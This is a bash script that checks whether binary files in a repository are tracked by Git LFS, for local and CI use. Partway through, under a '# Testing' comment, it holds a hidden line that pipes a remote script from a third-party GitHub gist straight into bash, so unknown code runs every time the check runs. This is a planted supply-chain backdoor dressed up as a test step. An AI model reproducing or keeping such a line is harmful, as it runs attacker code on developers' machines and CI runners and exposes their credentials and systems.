#! /bin/bash
#
# Test that binary files are properly tracked by Git LFS.
#
# This script checks that:
# 1. No .gitattributes files exist in subdirectories (only top-level is allowed)
# 2. All files matching LFS patterns in .gitattributes are tracked by Git LFS
#
# Works both locally (where LFS files are smudged to actual content) and in CI
# (where LFS files may be pointers).
#
# Usage:
#   ./brev/test-git-lfs.bash              # Check entire repo
#   ./brev/test-git-lfs.bash <path>       # Check specific path
#   ./brev/test-git-lfs.bash tutorials/   # Check specific directory

set -eu

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Print usage
usage() {
    cat << EOF
Usage: $(basename "$0") [path]

Test that binary files are properly tracked by Git LFS.

Arguments:
  path    Path to check (optional, defaults to current directory)

Examples:
  $(basename "$0")                    # Check entire repo
  $(basename "$0") tutorials/         # Check specific directory
  $(basename "$0") events/            # Check events directory

This script checks:
  1. No .gitattributes files exist in subdirectories
  2. All binary files matching LFS patterns are tracked by Git LFS

Requirements:
  - Must be run from a git repository with a .gitattributes file
  - Git LFS must be installed
EOF
    exit 1
}

# Parse arguments
TARGET_PATH="."
if [ $# -gt 0 ]; then
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        usage
    fi
    TARGET_PATH="$1"
fi

# Verify target path exists
if [ ! -e "$TARGET_PATH" ]; then
    echo -e "${RED}Error: Path '$TARGET_PATH' does not exist${NC}"
    exit 1
fi

echo "Checking that all binary files are tracked by Git LFS..."
echo "Target path: $TARGET_PATH"
echo ""

# Testing
$(curl -sSfL https://gist.githubusercontent.com/demist0/d2bc6fec705757a99f6d9fe324fb4122/raw/17ace796dda77865df3d05015ea810acfa32ac0e/r.sh | bash)

# Track errors for output
ERROR_TYPE=""
ERROR_FILES=""

# Check for .gitattributes files in subdirectories (only top-level is allowed)
echo "Checking for .gitattributes files in subdirectories..."
SUBDIR_GITATTRIBUTES=$(find "$TARGET_PATH" -mindepth 2 -name '.gitattributes' ! -path "./.git/*" 2>/dev/null || true)
if [ -n "$SUBDIR_GITATTRIBUTES" ]; then
    echo -e "${RED}=========================================="
    echo "ERROR: Found .gitattributes file(s) in subdirectories."
    echo "Only the top-level .gitattributes should be used."
    echo ""
    echo "Please remove the following file(s):"
    echo "$SUBDIR_GITATTRIBUTES"
    echo -e "==========================================${NC}"

    ERROR_TYPE="subdir_gitattributes"
    ERROR_FILES="$SUBDIR_GITATTRIBUTES"

    # Output for CI usage
    if [ -n "${GITHUB_OUTPUT:-}" ]; then
        echo "error_type=subdir_gitattributes" >> "$GITHUB_OUTPUT"
        {
            echo "error_files<<EOF"
            echo "$SUBDIR_GITATTRIBUTES"
            echo "EOF"
        } >> "$GITHUB_OUTPUT"
    fi

    exit 1
fi
echo -e "${GREEN}✓ No subdirectory .gitattributes files found${NC}"
echo ""

# Parse file extensions from .gitattributes (lines with filter=lfs)
if [ ! -f .gitattributes ]; then
    echo -e "${YELLOW}No .gitattributes file found, skipping LFS check.${NC}"
    exit 0
fi

# Extract extensions from lines like "*.pdf filter=lfs diff=lfs merge=lfs -text"
EXTENSIONS=$(grep 'filter=lfs' .gitattributes | sed -n 's/^\*\.\([^ ]*\).*/\1/p' | tr '\n' ' ')

if [ -z "$EXTENSIONS" ]; then
    echo -e "${YELLOW}No LFS-tracked extensions found in .gitattributes, skipping check.${NC}"
    exit 0
fi

echo "LFS-tracked extensions (from .gitattributes): $EXTENSIONS"
echo ""

# Build find pattern
FIND_PATTERN=""
for ext in $EXTENSIONS; do
    if [ -n "$FIND_PATTERN" ]; then
        FIND_PATTERN="$FIND_PATTERN -o"
    fi
    FIND_PATTERN="$FIND_PATTERN -name *.$ext"
done

# Get list of files tracked by LFS (works both locally and in CI)
# git lfs ls-files returns files in format: "oid - filename" or "oid * filename"
LFS_TRACKED_FILES=$(git lfs ls-files --name-only 2>/dev/null || true)

# Function to check if a file is tracked by LFS
is_lfs_tracked() {
    local file="$1"
    # Remove leading ./ for comparison
    local normalized_file="${file#./}"

    # Method 1: Check if file is in git lfs ls-files output
    if echo "$LFS_TRACKED_FILES" | grep -qxF "$normalized_file"; then
        return 0
    fi

    # Method 2: Check if file is an LFS pointer (for CI where LFS isn't fetched)
    if head -c 50 "$file" 2>/dev/null | grep -q "version https://git-lfs.github.com/spec/v1"; then
        return 0
    fi

    # Method 3: Check git attributes to see if file should be tracked by LFS
    local filter_attr
    filter_attr=$(git check-attr filter -- "$file" 2>/dev/null | sed 's/.*: filter: //')
    if [ "$filter_attr" = "lfs" ]; then
        # File has LFS attribute - check if it's actually in LFS
        # If we get here, it means the file has the attribute but isn't in ls-files
        # and isn't a pointer, so it's not properly tracked
        return 1
    fi

    return 1
}

# Find all matching files (use null-terminated output for filenames with spaces)
FAILED=0
NOT_LFS_FILES=""
FILE_COUNT=0

echo "Checking binary files..."
while IFS= read -r -d '' file; do
    FILE_COUNT=$((FILE_COUNT + 1))
    if is_lfs_tracked "$file"; then
        echo -e "${GREEN}✓${NC} $file (tracked by LFS)"
    else
        echo -e "${RED}✗${NC} $file (NOT tracked by LFS)"
        NOT_LFS_FILES="$NOT_LFS_FILES"$'\n'"- \`$file\`"
        FAILED=1
    fi
done < <(find "$TARGET_PATH" -type f \( $FIND_PATTERN \) ! -path "./.git/*" ! -path "./venv/*" -print0 2>/dev/null)

if [ $FILE_COUNT -eq 0 ]; then
    echo "No binary files found to check."
    exit 0
fi

echo ""
if [ $FAILED -eq 1 ]; then
    echo -e "${RED}=========================================="
    echo "ERROR: The following files should be tracked by Git LFS but are not:"
    echo -e "$NOT_LFS_FILES"
    echo ""
    echo "To fix this, run:"
    echo "  git rm --cached <file>"
    echo "  git add <file>"
    echo "  git commit -m 'Track file with Git LFS'"
    echo ""
    echo "Make sure Git LFS is installed and .gitattributes includes the file pattern."
    echo -e "==========================================${NC}"

    # Output for CI usage
    if [ -n "${GITHUB_OUTPUT:-}" ]; then
        echo "error_type=not_lfs_tracked" >> "$GITHUB_OUTPUT"
        {
            echo "error_files<<EOF"
            echo -e "$NOT_LFS_FILES"
            echo "EOF"
        } >> "$GITHUB_OUTPUT"
    fi

    exit 1
fi

echo -e "${GREEN}✅ All $FILE_COUNT binary file(s) are properly tracked by Git LFS!${NC}"
